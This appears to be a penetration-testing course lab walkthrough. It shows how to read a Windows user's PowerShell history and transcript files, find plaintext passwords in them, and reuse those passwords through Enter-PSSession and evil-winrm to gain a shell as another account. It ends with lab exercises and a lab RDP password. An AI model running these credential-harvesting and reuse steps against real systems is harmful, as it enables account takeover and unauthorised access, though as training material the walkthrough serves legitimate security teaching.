# Information Goldmine PowerShell

Empty result from Get-History
>``` shell
>PS C:\Users\dave> Get-History
>
># ========== Expected Result ==========
>Get-History
># =====================================
>```

Display path of the history file from PSReadline
>``` shell
>PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
>
># ========== Expected Result ==========
>(Get-PSReadlineOption).HistorySavePath
>C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
># =====================================
>```

Empty result from Get-History
>``` shell
>PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
>
># ========== Expected Result ==========
>...
>$PSVersionTable
>Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
>Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
>cd C:\
>ls
>cd C:\xampp
>ls
>type passwords.txt
>Clear-History
>Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
>Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
>exit
>Stop-Transcript
># =====================================
>```

Contents of the transcript file
>``` shell
>PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
>
># ========== Expected Result ==========
>type C:\Users\Public\Transcripts\transcript01.txt
>**********************
>Windows PowerShell transcript start
>Start time: 20220623081143
>Username: CLIENTWK220\dave
>RunAs User: CLIENTWK220\dave
>Configuration Name: 
>Machine: CLIENTWK220 (Microsoft Windows NT 10.0.22000.0)
>Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
>Process ID: 10336
>PSVersion: 5.1.22000.282
>...
>**********************
>Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
>PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
>PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
>PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
>PS C:\Users\dave> Stop-Transcript
>**********************
>Windows PowerShell transcript end
>End time: 20220623081221
>**********************
># =====================================
>```

Using the commands from the transcript file to obtain a PowerShell session as daveadmin
>``` shell
>PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
>
># ========== Expected Result ==========
>$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
># =====================================
>
>PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
>
># ========== Expected Result ==========
>$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
># =====================================
>
>PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
>
># ========== Expected Result ==========
>Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
># =====================================
>
>[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
>
># ========== Expected Result ==========
>whoami
>clientwk220\daveadmin
># =====================================
>```

No output from commands in the PSSession
>``` shell
>[CLIENTWK220]: PS C:\Users\daveadmin\Documents> cd C:\
>
># ========== Expected Result ==========
>cd C:\
># =====================================
>
>[CLIENTWK220]: PS C:\Users\daveadmin\Documents> pwd
>
># ========== Expected Result ==========
>pwd
># =====================================
>
>[CLIENTWK220]: PS C:\Users\daveadmin\Documents> dir
>
># ========== Expected Result ==========
>dir
># =====================================
>```

Using evil-winrm to connect to CLIENTWK220 as daveadmin
>``` shell
>kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
>
># ========== Expected Result ==========
>Evil-WinRM shell v3.5
>                                        
>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
>                                        
>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
>                                        
>Info: Establishing connection to remote endpoint
># =====================================
>
>*Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
>
># ========== Expected Result ==========
>clientwk220\daveadmin
># =====================================
>
>*Evil-WinRM* PS C:\Users\daveadmin\Documents> cd C:\
>*Evil-WinRM* PS C:\> dir
>
># ========== Expected Result ==========
>    Directory: C:\
>
>
>Mode                 LastWriteTime         Length Name
>----                 -------------         ------ ----
>d-----         8/27/2024   3:22 AM                FileZilla
>d-----          5/6/2022  10:24 PM                PerfLogs
>d-r---         8/27/2024   3:20 AM                Program Files
>d-r---          5/7/2022  12:40 AM                Program Files (x86)
>d-----          7/4/2022   1:00 AM                tools
>d-r---         8/21/2024   6:43 AM                Users
>d-----         8/21/2024   6:47 AM                Windows
>d-----         6/16/2022   1:17 PM                xampp
># =====================================
>```

Lab 1 - Follow the steps above and obtain an interactive shell as daveadmin on CLIENTWK220 (VM #1). Enter the flag, which can be found on the desktop.
>``` shell
>
>```
>

Lab 2 - Connect to CLIENTWK220 (VM #1) as daveadmin via RDP. Use the Event Viewer to search for events recorded by Script Block Logging. Find the password in these events.
>``` shell
>
>```
>

Lab 3 - Connect to CLIENTWK221 (VM #2) via RDP as user mac with the password IAmTheGOATSysAdmin!. Enumerate the machine and use the methods from this section to find the flag.
>``` shell
>
>```
>
